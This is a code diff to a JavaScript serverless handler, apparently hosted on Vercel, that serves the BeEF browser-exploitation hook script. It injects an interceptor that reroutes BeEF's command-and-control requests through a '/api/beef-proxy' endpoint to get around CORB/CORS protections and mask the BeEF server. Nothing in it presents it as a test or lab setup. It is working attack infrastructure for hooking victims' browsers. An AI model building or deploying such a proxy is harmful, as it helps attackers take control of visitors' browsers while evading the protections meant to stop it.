@@ -106,24 +106,34 @@ export default async function handler(req, res) {
     }
 
     // CRITICAL FIX: Inject URL interceptor at the START of hook.js
-    // This patches BeEF's AJAX calls to rewrite HTTP URLs to HTTPS at runtime
+    // This patches BeEF's AJAX calls to route through Vercel proxy
     const urlInterceptor = `
-// === INJECTED URL INTERCEPTOR FOR MIXED CONTENT FIX ===
+// === INJECTED URL INTERCEPTOR FOR CORB/CORS FIX ===
 (function() {
   const BEEF_ORIGIN = '${origin}';
   const BEEF_HOST = '${hostname}';
+  const PROXY_BASE = window.location.origin + '/api/beef-proxy';
   
-  // Helper function to rewrite URLs
+  // Helper function to rewrite URLs to go through Vercel proxy
   function rewriteUrl(url) {
     if (!url) return url;
-    let fixedUrl = String(url);
+    let originalUrl = String(url);
     
-    // Replace http://beef-host:3000 with https://beef-host
-    if (fixedUrl.includes('http://' + BEEF_HOST)) {
-      fixedUrl = fixedUrl.replace(/http:\\/\\/[^/]+/, BEEF_ORIGIN);
-      console.log('[BeEF Proxy] Rewrote URL:', url, '->', fixedUrl);
-      return fixedUrl;
+    // Check if this is a BeEF URL that needs proxying
+    if (originalUrl.includes(BEEF_HOST)) {
+      // Extract path and query from the BeEF URL
+      const beefUrlObj = new URL(originalUrl.replace(/^http:\\/\\//, 'https://'));
+      const path = beefUrlObj.pathname;
+      const search = beefUrlObj.search;
+      
+      // Route through our proxy: /api/beef-proxy?path=/dh&original=params
+      const proxiedUrl = PROXY_BASE + '?path=' + encodeURIComponent(path) + 
+                         (search ? '&' + search.substring(1) : '');
+      
+      console.log('[BeEF Proxy] Routing through proxy:', originalUrl, '->', proxiedUrl);
+      return proxiedUrl;
     }
+    
     return url;
   }
   
